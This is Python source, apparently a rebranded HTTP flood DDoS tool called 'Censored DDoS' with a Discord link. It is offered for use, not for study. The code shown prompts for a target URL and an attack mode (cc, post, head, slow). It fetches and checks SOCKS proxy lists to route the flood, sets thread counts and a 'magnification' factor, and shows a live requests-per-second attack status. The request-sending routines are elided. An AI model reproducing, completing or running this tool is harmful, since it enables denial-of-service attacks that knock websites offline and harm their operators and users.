...
| ___                                                _     ___    ___           ___   |
|(  _ \                                             ( )   (  _ \ (  _ \        (  _ \ |
|| ( (_)   __    ___    ___    _    _ __    __     _| |   | | ) || | ) |   _   | (_(_)|
|| |  _  / __ \/  _  \/  __) / _ \ (  __) / __ \ / _  |   | | | )| | | ) / _ \  \__ \ |
|| (_( )(  ___/| ( ) |\__  \( (_) )| |   (  ___/( (_| |   | |_) || |_) |( (_) )( )_) ||
|(____/  )\___)(() (_)(__(_/ \ __/ (()    )\___) ) _ _)   (____/ (____/  \ __/  \(___)|
|       (__)   (_)      /(   /(    (_)   (__)   (__)                     /(     (_)   |
|                      (__) (__)                                        (__)          |
└─────────────────────────────────────────────────────────────────────────────────────┘
Version 1.0.1
					    Remastered By Censored
┌─────────────────────────────────────────────┐
│   Tos: https://discord.gg/censoredunlocks   │
├─────────────────────────────────────────────┤
│                 Remastered:                 |
|                                             │
...
├─────────────────────────────────────────────┤
│ Link:  https://discord.gg/censoredunlocks   │
└─────────────────────────────────────────────┘'''))
...
def InputOption(question,options,default):
	...
	while ans == "":
		...
		if ans == "":
			...
			print((Colorate.Horizontal(Colors.red_to_white, f'''> Please enter the correct option''')))
			ans = ""
			continue
	return ans
...
def CheckerOption():
	global proxies
	N = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Do you need to get socks list?(y/n,default=y): '''))))
	if N == 'y' or N == "" :
		downloadsocks(choice)
	else:
		pass
	if choice == "4":
		out_file = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Socks4 Proxy file path(socks4.txt): '''))))
		if out_file == '':
		...
		out_file = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Socks5 Proxy file path(socks5.txt): '''))))
		if out_file == '':
		...
		check_list(out_file)
		proxies = open(out_file).readlines()
	print ((Colorate.Horizontal(Colors.red_to_white, f'''> Proxy Loaded''')))
	time.sleep(0.03)
	ans = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Do u need to check the socks list?(y/n, defualt=y): '''))))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Delay of socks(seconds, default=1): '''))))
		if ms == "":
			ms = int(1)
		else :
			try:
...
def OutputToScreen(ind_rlock):
	...
	while 1:
		if i > 3:
			i = 0
		print("{:^50}".format("       Attack Live Status"))
		print("{:^50}".format("Censored DDoS      |         RPS"))
		...
		for k,v in ind_dict.items():
			...
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^50}".format(" ["+sp_char[i]+"] Censored DDoS | Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*50)
...
def check_socks(ms):#Coded by Leeon123
	...
	ans = input((Colorate.Horizontal(Colors.red_to_white, f'''> Do u want to save them in a file? (y/n, default=y) : ''')))
	if ans == "y" or ans == "":
		if choice == "4":
			...
			fp.close()
			print((Colorate.Horizontal(Colors.red_to_white, f'''> They are saved in socks4.txt.''')))
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print((Colorate.Horizontal(Colors.red_to_white, f'''> They are saved in socks5.txt.''')))
			
def check_list(socks_file):
	print((Colorate.Horizontal(Colors.red_to_white, f'''> Checking list''')))
...
def downloadsocks(choice):
	if choice == "4":
		...
		try:#credit to All3xJ
			...
			pass
		print((Colorate.Horizontal(Colors.red_to_white, f'''> Have already downloaded socks4 list as socks4.txt''')))
	if choice == "5":
		...
		try:
			...
			f.close()
		print((Colorate.Horizontal(Colors.red_to_white, f'''> Have already downloaded socks5 list as socks5.txt''')))
...
def main():
	...
	global cookies
	global brute
	print(Colorate.Horizontal(Colors.red_to_white, f'''> Mode: [cc/post/head/slow/check]''')),
	mode = InputOption((Colorate.Horizontal(Colors.red_to_white, f'''> Choose Your Mode (default=cc) : ''')),["cc","post","head","slow","check"],"cc")
	url = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Input the target url : ''')))).strip()
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption((Colorate.Horizontal(Colors.red_to_white, f'''> Customize post data? (y/n, default=n): ''')),["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(input((Colorate.Horizontal(Colors.red_to_white, f'''> Input the file's path: '''))).strip()).readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption((Colorate.Horizontal(Colors.red_to_white, f'''> Customize cookies? (y/n, default=n): ''')),["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input((Colorate.Horizontal(Colors.red_to_white, f'''Plese input the cookies: ''')))).strip()
	choice = InputOption((Colorate.Horizontal(Colors.red_to_white, f'''> Choose your socks mode(4/5, default=5): ''')),["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		CheckerOption()
		print((Colorate.Horizontal(Colors.red_to_white, f'''> End of process ''')))
		return
	if mode == "slow":	
		thread_num = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Connections(default=400): '''))))
	else:
		thread_num = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Threads(default=400): '''))))
	if thread_num == "":
		thread_num = int(400)
	else:
		try:
			...
			sys.exit((Colorate.Horizontal(Colors.red_to_white, f'''Error thread number''')))
	CheckerOption()
	ind_rlock = threading.RLock()
	if mode == "slow":
		input((Colorate.Horizontal(Colors.red_to_white, f'''Press Enter to continue.''')))
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Input the Magnification(default=100): '''))))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input((Colorate.Horizontal(Colors.red_to_white, f'''> Enable boost mode[beta](y/n, default=n): '''))))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
		...
		print(Colorate.Horizontal(Colors.red_to_white, f'''> Building threads...'''))
		SetupIndDict()
